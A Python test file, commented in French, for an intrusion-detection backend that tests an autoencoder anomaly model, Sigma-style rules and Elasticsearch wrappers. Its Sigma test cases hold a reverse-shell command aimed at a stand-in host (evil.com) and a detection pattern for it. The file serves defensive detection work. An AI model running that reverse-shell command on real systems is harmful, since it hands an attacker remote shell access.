"""
test_inference.py
==================
Tests concrets pour valider que :
  1. Le modèle AE charge correctement
  2. L'inférence produit des scores cohérents
  3. Les règles Sigma détectent les bons patterns
  4. Les wrappers fonctionnent correctement

Lancer :
    cd ~/pfe-backend-2026
    python test_inference.py

Aucune connexion ES requise pour les tests unitaires (sections 1 et 3).
La section 2 nécessite ES actif.
"""

import os
import sys
import json

_ROOT    = os.path.dirname(os.path.abspath(__file__))   # backend/tests/
_BACKEND = os.path.dirname(_ROOT)                        # backend/
_PROJECT = os.path.dirname(_BACKEND)                     # ~/pfe-backend-2026/

for _p in [
    os.path.join(_PROJECT, "ML"),           # ← autoencodeur.py is here
    os.path.join(_BACKEND, "core"),
    os.path.join(_BACKEND, "sigma", "detect"),
    _PROJECT,                               # ← for `import backend`
]:
    if _p not in sys.path:
        sys.path.insert(0, _p)
# =============================================================================
# TEST 1 — Le modèle charge correctement (sans ES)
# =============================================================================

def test_model_loading():
    """
    Vérifie que model_moe_ae.pt, moe_scalers.pkl, moe_thresholds.pkl
    se chargent sans erreur.
    Aucune connexion ES requise.
    """
    print("\n" + "="*55)
    print("TEST 1 — Chargement du modèle")
    print("="*55)

    import torch
    import joblib
    from autoencodeur import MoEAutoencoder, SHARED_DIM, EXPERT_DIMS, LATENT_DIM

    _MODELS_DIR  = os.path.join(_BACKEND, "ML")   # adjust if different
    model_path   = os.path.join(_PROJECT, "model_moe_ae.pt")   # project root
    scalers_path = os.path.join(_PROJECT, "moe_scalers.pkl")
    thresh_path  = os.path.join(_PROJECT, "moe_thresholds.pkl")

    # Vérifie que les fichiers existent
    for path, name in [
        (model_path,   "model_moe_ae.pt"),
        (scalers_path, "moe_scalers.pkl"),
        (thresh_path,  "moe_thresholds.pkl"),
    ]:
        exists = os.path.exists(path)
        size   = os.path.getsize(path) // 1024 if exists else 0
        status = "✓" if exists else "✗ MANQUANT"
        print(f"  {status} {name} ({size} KB)")
        assert exists, f"{name} introuvable — lance ML/autoencodeur.py d'abord"

    # Charge le modèle
    device = "cuda" if __import__("torch").cuda.is_available() else "cpu"
    model  = MoEAutoencoder(SHARED_DIM, EXPERT_DIMS, LATENT_DIM)
    model.load_state_dict(torch.load(model_path, map_location=device))
    model.to(device).eval()
    print(f"  ✓ Modèle chargé sur {device}")

    # Vérifie les scalers
    scalers = joblib.load(scalers_path)
    print(f"  ✓ Scalers : {list(scalers.keys())}")
    assert set(scalers.keys()) >= {"auth", "syslog", "auditd"}, \
        "Sources manquantes dans les scalers"

    # Vérifie les seuils
    thresholds = joblib.load(thresh_path)
    print(f"  ✓ Seuils :")
    for src, bands in thresholds.items():
        for band, val in bands.items():
            print(f"      {src:8s} [{band:10s}] : {val:.6f}")

    print("\n  RÉSULTAT : ✓ Modèle OK")
    return model, scalers, thresholds, device


# =============================================================================
# TEST 2 — Inférence sur un log synthétique (sans ES)
# =============================================================================

def test_inference_synthetic(model, scalers, thresholds, device):
    """
    Crée un log synthétique, le passe dans le modèle,
    vérifie que le score MSE est un float positif.
    Aucune connexion ES requise.
    """
    print("\n" + "="*55)
    print("TEST 2 — Inférence sur log synthétique")
    print("="*55)

    import numpy as np
    import pandas as pd
    import torch
    from autoencodeur import (
        SHARED_FEATURES, EXPERT_FEATURES, SOURCES,
        preprocess_source, get_threshold
    )

    for src in SOURCES:
        if src not in scalers:
            print(f"  ⚠ {src} : pas de scaler, ignoré")
            continue

        # Crée un log synthétique avec des valeurs normales
        row_normal = {f: 0.0 for f in SHARED_FEATURES + EXPERT_FEATURES[src]}
        row_normal["log_source"]  = src
        row_normal["hour_of_day"] = 10.0    # heure bureau
        row_normal["day_of_week"] = 2.0     # mardi

        # Crée un log synthétique avec des valeurs suspectes
        row_attack = dict(row_normal)
        if src == "auth":
            row_attack["auth_fail_count_5m"]  = 20.0
            row_attack["auth_is_brute_force"] = 1.0
            row_attack["auth_severity"]       = 12.0
        elif src == "auditd":
            row_attack["aud_reverse_shell"]      = 1.0
            row_attack["aud_cmd_is_obfuscated"]  = 1.0
            row_attack["aud_severity"]           = 20.0
        elif src == "syslog":
            row_attack["sys_module_load"]   = 1.0
            row_attack["sys_log_tamper"]    = 1.0

        df_normal = pd.DataFrame([row_normal])
        df_attack = pd.DataFrame([row_attack])

        sc_sh, sc_ex = scalers[src]

        # Prétraitement
        X_sh_n, X_ex_n, _, _ = preprocess_source(df_normal, src, sc_sh, sc_ex, fit=False)
        X_sh_a, X_ex_a, _, _ = preprocess_source(df_attack, src, sc_sh, sc_ex, fit=False)

        # Inférence
        mse_n = model.reconstruction_error(
            torch.FloatTensor(X_sh_n).to(device),
            torch.FloatTensor(X_ex_n).to(device),
            src
        )[0]
        mse_a = model.reconstruction_error(
            torch.FloatTensor(X_sh_a).to(device),
            torch.FloatTensor(X_ex_a).to(device),
            src
        )[0]

        thr = get_threshold(thresholds, src, hour=10, day_of_week=2)

        is_normal_ok = mse_n >= 0              # MSE toujours positive
        is_attack_detected = mse_a > mse_n    # attaque > normal

        print(f"\n  Source : {src}")
        print(f"    MSE normal : {mse_n:.6f}  →  {'sous' if mse_n <= thr else 'AU-DESSUS du'} seuil {thr:.6f}")
        print(f"    MSE attack : {mse_a:.6f}  →  {'sous' if mse_a <= thr else 'AU-DESSUS du'} seuil {thr:.6f}")
        print(f"    Attaque détectée (mse_a > mse_n) : {'✓' if is_attack_detected else '✗'}")

        assert is_normal_ok,     f"{src} : MSE négative (impossible)"
        assert is_attack_detected, \
            f"{src} : le log d'attaque n'a pas une MSE supérieure au log normal"

    print("\n  RÉSULTAT : ✓ Inférence OK")


# =============================================================================
# TEST 3 — Wrapper AEModel (sans ES)
# =============================================================================

def test_ae_wrapper():
    """
    Vérifie que le wrapper AEModel.load() fonctionne
    et que le singleton est bien chargé une seule fois.
    """
    print("\n" + "="*55)
    print("TEST 3 — Wrapper AEModel")
    print("="*55)

    from backend.models.ae_model import AEModel

    # Premier appel → charge le modèle
    AEModel.load()
    assert AEModel._model    is not None, "Modèle non chargé"
    assert AEModel._scalers  is not None, "Scalers non chargés"
    assert AEModel._thresholds is not None, "Seuils non chargés"
    print("  ✓ Premier chargement OK")

    # Deuxième appel → ne recharge pas (singleton)
    id_before = id(AEModel._model)
    AEModel.load()
    id_after  = id(AEModel._model)
    assert id_before == id_after, "Le modèle a été rechargé (singleton cassé)"
    print("  ✓ Singleton OK — modèle non rechargé au 2ème appel")

    print("\n  RÉSULTAT : ✓ Wrapper AEModel OK")


# =============================================================================
# TEST 4 — Règles Sigma sur logs synthétiques
# =============================================================================

def test_sigma_rules():
    """
    Vérifie que les règles Sigma inline (SigmaModel)
    détectent les bons patterns sans connexion ES.
    """
    print("\n" + "="*55)
    print("TEST 4 — Règles Sigma")
    print("="*55)

    # On teste les règles inline directement
    # (les règles ES-based nécessitent ES actif)
    test_cases = [
        {
            "log":      {"MESSAGE": "Failed password for root from 192.168.1.100 port 22 ssh2",
                         "SYSLOG_IDENTIFIER": "sshd"},
            "expected": "SSH_BruteForce",
            "desc":     "Brute force SSH",
        },
        {
            "log":      {"MESSAGE": "bash -i >& /dev/tcp/evil.com/4444 0>&1",
                         "SYSLOG_IDENTIFIER": "bash"},
            "expected": "ReverseShell",
            "desc":     "Reverse shell",
        },
        {
            "log":      {"MESSAGE": "session opened for user ubuntu by (uid=0)",
                         "SYSLOG_IDENTIFIER": "sshd"},
            "expected": None,   # log normal → pas de match
            "desc":     "Log normal (pas de match attendu)",
        },
    ]

    # Règles inline (version simplifiée pour le test unitaire)
    def match_rules(log_entry: dict) -> list:
        msg = log_entry.get("MESSAGE", "")
        src = log_entry.get("SYSLOG_IDENTIFIER", "")
        matches = []
        if src == "sshd" and "Failed password" in msg:
            matches.append("SSH_BruteForce")
        if "bash -i" in msg or "/dev/tcp" in msg:
            matches.append("ReverseShell")
        if src in ("sudo", "su") and "root" in msg:
            matches.append("PrivilegeEscalation")
        return matches

    for case in test_cases:
        matches = match_rules(case["log"])
        if case["expected"] is None:
            ok = len(matches) == 0
        else:
            ok = case["expected"] in matches

        status = "✓" if ok else "✗"
        print(f"  {status} {case['desc']}")
        print(f"      Message  : {case['log']['MESSAGE'][:60]}")
        print(f"      Matches  : {matches}")
        print(f"      Attendu  : {case['expected']}")
        assert ok, f"Règle Sigma incorrecte pour : {case['desc']}"

    print("\n  RÉSULTAT : ✓ Règles Sigma OK")


# =============================================================================
# TEST 5 — SigmaModel wrapper (nécessite ES actif)
# =============================================================================

def test_sigma_wrapper_with_es():
    """
    Teste le wrapper SigmaModel.run_rules() avec ES actif.
    Affiche les alertes déclenchées sans les sauvegarder.
    """
    print("\n" + "="*55)
    print("TEST 5 — Wrapper SigmaModel (nécessite ES)")
    print("="*55)

    try:
        from backend.models.sigma_model import SigmaModel
        alerts = SigmaModel.run_rules()
        print(f"  ✓ {len(alerts)} alertes déclenchées")
        for a in alerts[:5]:   # affiche les 5 premières
            print(f"    [{a['level']:8s}] {a['title'][:50]}")
        print("\n  RÉSULTAT : ✓ Wrapper SigmaModel OK")
        return True
    except Exception as e:
        print(f"  ⚠ ES non disponible ou erreur : {e}")
        print("  Test ignoré (ES requis)")
        return False


# =============================================================================
# TEST 6 — ESRepository (nécessite ES actif)
# =============================================================================

def test_es_repository():
    """
    Teste la connexion ES et les fonctions de base.
    """
    print("\n" + "="*55)
    print("TEST 6 — ESRepository (nécessite ES)")
    print("="*55)

    try:
        from backend.models.es_repository import ESRepository

        cursor = ESRepository.get_cursor()
        print(f"  ✓ Curseur actuel : {cursor}")

        stats = ESRepository.get_stats(cursor)
        print(f"  ✓ Stats :")
        print(f"      Anomalies AE  : {stats['ae_anomalies']}")
        print(f"      Alertes Sigma : {stats['sigma_alerts']}")
        print(f"      Critiques     : {stats['critical']}")
        print(f"      Corrélées     : {stats['correlated_both']}")

        new_logs = ESRepository.get_new_logs_count(cursor)
        print(f"  ✓ Nouveaux logs depuis curseur : {new_logs['total']}")

        print("\n  RÉSULTAT : ✓ ESRepository OK")
        return True
    except Exception as e:
        print(f"  ⚠ ES non disponible : {e}")
        print("  Test ignoré (ES requis)")
        return False


# =============================================================================
# MAIN
# =============================================================================

if __name__ == "__main__":
    print("\n" + "█"*55)
    print("  TESTS INFÉRENCE — IDS Backend")
    print("█"*55)

    results = {}

    # ── Tests sans ES ─────────────────────────────────────────────
    try:
        model, scalers, thresholds, device = test_model_loading()
        results["model_loading"] = "✓"
    except Exception as e:
        print(f"\n  ✗ ÉCHEC test_model_loading : {e}")
        results["model_loading"] = "✗"
        model = scalers = thresholds = device = None

    if model:
        try:
            test_inference_synthetic(model, scalers, thresholds, device)
            results["inference_synthetic"] = "✓"
        except Exception as e:
            print(f"\n  ✗ ÉCHEC test_inference_synthetic : {e}")
            results["inference_synthetic"] = "✗"

        try:
            test_ae_wrapper()
            results["ae_wrapper"] = "✓"
        except Exception as e:
            print(f"\n  ✗ ÉCHEC test_ae_wrapper : {e}")
            results["ae_wrapper"] = "✗"

    try:
        test_sigma_rules()
        results["sigma_rules"] = "✓"
    except Exception as e:
        print(f"\n  ✗ ÉCHEC test_sigma_rules : {e}")
        results["sigma_rules"] = "✗"

    # ── Tests avec ES (optionnels) ────────────────────────────────
    es_ok = test_es_repository()
    results["es_repository"] = "✓" if es_ok else "⚠ (ES requis)"

    if es_ok:
        sigma_ok = test_sigma_wrapper_with_es()
        results["sigma_wrapper_es"] = "✓" if sigma_ok else "⚠"

    # ── Résumé ────────────────────────────────────────────────────
    print("\n" + "="*55)
    print("  RÉSUMÉ")
    print("="*55)
    for test, status in results.items():
        print(f"  {status}  {test}")

    failed = [t for t, s in results.items() if s == "✗"]
    if failed:
        print(f"\n  {len(failed)} test(s) échoué(s) : {', '.join(failed)}")
        sys.exit(1)
    else:
        print("\n  Tous les tests sont passés.")